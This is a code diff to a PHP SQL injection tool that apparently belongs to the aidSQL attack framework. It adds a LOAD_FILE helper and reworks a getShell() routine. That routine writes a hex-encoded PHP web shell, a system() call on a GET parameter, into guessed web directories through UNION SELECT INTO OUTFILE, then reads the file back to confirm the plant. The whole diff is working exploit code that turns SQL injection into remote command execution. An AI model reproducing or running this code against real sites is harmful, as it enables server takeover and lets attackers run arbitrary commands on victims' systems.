@@ -404,7 +404,7 @@
 			 * @return String, sql injection string
 			 */
 
-			private function generateInjection($select,$from=NULL){
+			private function generateInjection($select,$from=NULL,$concat=TRUE){
 
 				$fields=array();
 
@@ -424,7 +424,11 @@
 
 					if($i==$this->_affectedField){
 
-						$fields[]=$this->tagConcat($select);
+						if($concat){
+							$fields[]=$this->tagConcat($select);
+						}else{
+							$fields[]=$select;
+						}
 
 					}else{
 
@@ -450,7 +454,7 @@
 			*Combines URL execution with parsing
 			*/
 
-			public function analyzeInjection($injection){
+			public function analyzeInjection($injection,$useEndingPayload=TRUE){
 
 				$variable	= $this->_affectedVariable;
 				$value		= $variable["value"];
@@ -466,7 +470,12 @@
 
 				}
 
-				$value		= "$value UNION ALL SELECT $injection ".$this->_currTerminatingPayload." ".$this->getQueryCommentOpen();
+				if($useEndingPayload){
+					$value		= "$value UNION ALL SELECT $injection ".$this->_currTerminatingPayload." ".$this->getQueryCommentOpen();
+				}else{
+					$value		= "$value UNION ALL SELECT $injection ".$this->getQueryCommentOpen();
+				}
+
 				$content		= $this->execute($variable,$value);
 
 				if($content===FALSE){
@@ -569,7 +578,17 @@
 
 			}
 
+			public function loadFile($file=NULL){
+
+				$select	=	"LOAD_FILE(".\String::hexEncode($file).')';	
+				$from		=	"";
+				return $this->generateInjection($select,$from);	
+
+			}
+
 			public function getShell(\aidSQL\core\PluginLoader &$pLoader){
+
+				$restoreUrl				=	$this->_httpAdapter->getUrl();
 
 				$webDefaultsPlugin	=	$pLoader->getPluginInstance("disclosure","defaults",$this->_httpAdapter,$this->_log);
 				$information			=	$webDefaultsPlugin->getInfo();
@@ -585,26 +604,71 @@
 				$unixDirectories		=	$information->getUnixDirectories();
 				$winDirectories		=	$information->getWindowsDirectories();
 
-				$shell				=	"0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e";
-
 				if(!sizeof($webDirectories)){
 
 					$this->log("Web defaults Plugin failed to get a valid directory for injecting a shell :(",2,"red");
-					continue;
 
 				}
+
+				$shellCode	=	"0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e";
+			
+				$url	=	new \aidSQL\http\URL($this->_httpAdapter->getUrl());
+				$host	=	$url->getHost();
+				$url	=	$url->getScheme()."://$host";
+
+				$fileName	=	substr(preg_replace("#[0-9]#",'',md5(rand(0,time()))),0,mt_rand(1,8)).".php";	
 
 				foreach($webDirectories as $key=>$webDir){
 
-					$this->log("Trying to inject shell in directory \"$dir\"",0,"white");
+					$webDir	=	trim($webDir,'/').'/';
 
 					foreach($unixDirectories as $unixDir){
+	
+						$this->_httpAdapter->setUrl($restoreUrl);
+			
+						$unixDir					=	'/'.trim($unixDir,'/');
+						$shellWebLocation		=	$url.'/'.$webDir.$fileName;
 
-						$outfile	=	"INTO OUTFILE $unixDir$webDir";
+						$shellDirLocations	=	array();
+						$shellDirLocations[]	=	$unixDir.'/'.$webDir.$fileName;
+						$shellDirLocations[]	=	$unixDir.'/'.$host.'/'.$webDir.$fileName;
 
-					}	
+						if(preg_Match("#www\.#",$host)){
+							$shellDirLocations[]	=	$unixDir.'/'.substr($host,strpos($host,'.')+1).'/'.$webDir.$fileName;
+						}
+
+						foreach($shellDirLocations as $shellDirLocation){
+
+							$this->log("Trying to inject shell in \"$shellDirLocation\"",0,"white");
+							$outFile		=	"INTO OUTFILE '$shellDirLocation'";
+
+							$injection	=	$this->generateInjection($shellCode,$outFile);
+
+							try{
+
+								$this->analyzeInjection($injection,FALSE);
+								$result			=	$this->analyzeInjection($this->loadFile($shellDirLocation));
+								$decodedShell	=	\String::asciiEncode($shellCode);
+							
+								if($result!==FALSE&&sizeof($result)){
+
+									if($result[0]==$decodedShell){
+										$this->log("LIKE A BOSS",0,"light_green");
+										return $shellWebLocation;
+									}
+
+								}
+							
+							}catch(\Exception $e){
+							}
+
+						}	
+
+					}
 
 				}
+
+				return FALSE;
 
 			}
 
